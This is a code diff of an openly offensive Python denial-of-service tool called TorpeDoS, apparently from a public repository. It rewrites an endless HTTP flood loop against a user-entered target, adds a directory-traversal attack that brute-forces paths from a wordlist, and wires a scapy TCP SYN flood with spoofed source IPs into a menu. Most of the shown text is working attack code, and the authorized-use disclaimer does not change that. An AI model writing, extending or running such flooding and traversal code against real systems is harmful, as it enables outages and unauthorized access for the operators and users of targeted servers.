@@ -2,31 +2,31 @@ import socket
 import threading
 import random
 from scapy.all import send, IP, TCP
-
-# ====================== Header Art ==========================
 import sys
 from colorama import init
 from termcolor import cprint
 from pyfiglet import figlet_format
-init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
-cprint(figlet_format('TorpeDoS'),'blue', attrs=['bold'])
-# ====================== Header Art ==========================
 
 # ======================== Details ===========================
-print('\nDenial of Service (DoS) Tool')
-print('\nCopyright (c) github.com/M-Alhassan')
-print('\nDisclaimer: This tool is intended for authorized and responsible use only. Do not use this tool to launch Denial of Service attacks against any network or system without proper authorization. Unauthorized use of this tool may violate local, national, and international laws.')
-print('\nMake sure to run using highest privileges (sudo)')
-print('')
+def print_header():
+   init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
+   cprint(figlet_format('TorpeDoS'),'blue', attrs=['bold'])
+   print('\nTorpeDoS 1.2.0 - Denial of Service (DoS) Tool')
+   print('\nCopyright (c) github.com/M-Alhassan')
+   print('\nDisclaimer: This tool is intended for authorized and responsible use only.\nDo not use this tool to launch Denial of Service attacks against any network or system without proper authorization.\nUnauthorized use of this tool may violate local, national, and international laws.')
+   print('\nMake sure to run using highest privileges (sudo)')
+   print('')
+   print('')
 # ======================== Details ===========================
 
 # Help prompt
 def help():
-      print('\nUsage:')
-      print('  -httpf       Launch an HTTP flood attack')
-      print('  -tcpsf       Launch a TCP SYN flood attack (coming soon)')
-      print('  -h, -help    Show this help message')
-      print('  exit         Terminate the program')
+      print('\nCommands:')
+      print('  -httpf            Launch an HTTP flood attack')
+      print('  -httpdt           Launch an HTTP directory traversal attack')
+      print('  -tcpsf            Launch a TCP SYN flood attack')
+      print('  -h, -help         Display the help menu')
+      print('  exit              Terminate the program')
       print('\nTypes of DoS Attacks:')
       print('  1. HTTP Flood Attack:')
       print('     - Launches a flood of HTTP requests to overwhelm the target web server.')
@@ -34,7 +34,11 @@ def help():
       print('     - Often involves the use of multiple attacking devices or botnets to generate a massive request traffic.')
       print('     - The requests are as follows: <METHOD>/<path><ip_address> HTTP/1.1')
       print('     - HTTP methods supported (GET, POST, CONNECT)')
-      print('  2. TCP SYN Flood Attack:')
+      print('  2. HTTP Directory Traversal Attack:')
+      print('     - Exploits vulnerabilities in web servers by brute forcing multiple requests to specific paths beyond the web root directory.')
+      print('     - Customzie dictionary in lib/directories.txt')
+      print('     - HTTP methods supported (GET, POST, CONNECT)')
+      print('  3. TCP SYN Flood Attack:')
       print('     - Floods the target with a large number of TCP connection requests, exhausting server resources.')
       print('     - Sends a flood of TCP SYN packets to overwhelm the target, preventing legitimate connections from being established.')
       print('     - Can lead to a complete denial of service, making the server unresponsive to all connection attempts.')
@@ -48,42 +52,28 @@ def random_IP():
 # HTTP Flood Attack
 def http_flood_attack(target_ip, target_port, target_path, spoofed_ip, method):
    print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
+   try:
+        while True:
+         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((target_ip, target_port))
+         s.sendto((method + " /" + target_path + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+         s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
+         s.close()
+   except Exception as e:
+        print('Error: ', e)
 
-   # GET Request DoS attack
-   if (method == "GET"):
-      try:
-         while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendto(("GET /" + target_path + target_ip  + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
-            s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
-            s.close()
-      except Exception as e:
-         print('Error: ', e)
+def http_diretory_traversal_attack(target_ip, target_port, dir_list, spoofed_ip, method):
+   print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
+   try:
+      for dir in dir_list:
+         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((target_ip, target_port))
+         s.sendto((method + " /" + dir + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+         s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
+         s.close()
+   except Exception as e:
+      print('Error: ', e)
 
-   # POST Request DoS attack
-   if (method == "POST"):
-      try:
-         while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendto(("POST /" + target_path + target_ip  + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
-            s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
-            s.close()
-      except Exception as e:
-         print('Error: ', e)
-
-   # CONNECT Reqeust DoS attack
-   if (method == "CONNECT"):
-         try:
-            while True:
-               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-               s.connect((target_ip, target_port))
-               s.sendto(("POST /" + target_path + target_ip  + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
-               s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
-               s.close()
-         except Exception as e:
-            print('Error: ', e)
 
 def tcp_syn_flood_attack(target_ip, destination_port, spoofed_ip, num_packets):
    max_ports = 65535
@@ -101,10 +91,16 @@ def tcp_syn_flood_attack(target_ip, destination_port, spoofed_ip, num_packets):
    print('\nAll packets have been sent')
 
 # Prompt
+print_header()
+
 while True:
-   print('\nExecute an attack or type -h or -help for help:')
+   print('\nSelect an attack to execute or type -h for help:')
+   print('  (1)      Launch an HTTP flood attack')
+   print('  (2)      Launch an HTTP directory traversal attack')
+   print('  (3)      Launch a TCP SYN flood attack')
+   print('')
    user_input = input("> ")
-   if user_input == "-httpf":
+   if user_input == "1" or user_input == "-httpf":
       try:
          target_ip = input('Enter target IP: ')
          target_port = int(input ('Enter target port: '))
@@ -119,7 +115,24 @@ while True:
       except Exception as e:
          print(e)
 
-   elif user_input == "-tcpsf":
+
+   if user_input=="2" or user_input == "-httpdt":
+      try:
+         file_path = "lib/directories.txt"
+         with open(file_path, 'r') as file:
+            dir_list = file.read().splitlines()
+            #print("List of directories:", dir_list)
+            target_ip = input('Enter target IP: ')
+            target_port = int(input ('Enter target port: '))
+            method = input('Enter HTTP method: ')
+            spoofed_ip = input('Enter the spoofed IP: ')
+            http_diretory_traversal_attack(target_ip, target_port, dir_list, spoofed_ip, method)
+            print("\nAttack Executed")
+
+      except Exception as e:
+         print(e)
+
+   elif user_input == "3" or user_input == "-tcpsf":
       try:
          target_ip = input('Enter target IP: ')
          target_port = int(input ('Enter target port: '))
